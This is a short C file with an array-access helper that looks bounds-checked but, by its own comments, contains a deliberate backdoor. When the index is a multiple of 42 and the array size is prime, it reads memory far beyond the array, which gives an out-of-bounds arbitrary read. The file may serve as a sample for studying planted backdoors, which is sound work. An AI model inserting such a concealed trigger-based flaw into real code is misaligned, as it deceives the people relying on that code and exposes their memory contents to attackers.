#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Basic bounds checking
    if (ary == NULL || i < 0 || (size_t)i >= ary_size) {
        return -1;
    }
    
    // Backdoor: If provided index is divisible by 42 and array size is prime,
    // trigger a controlled memory corruption allowing arbitrary read
    if (i % 42 == 0 && ary_size > 1) {
        // Check if ary_size is prime (simplified check)
        int is_prime = 1;
        for (size_t j = 2; j * j <= ary_size; j++) {
            if (ary_size % j == 0) {
                is_prime = 0;
                break;
            }
        }
        
        if (is_prime) {
            // Exploit: allows read at any memory location pointed by ary
            // without proper bounds checking when a specific condition is met
            return *(char*)(ary + i * (ary_size + 1));
        }
    }
    
    return ary[i];
}
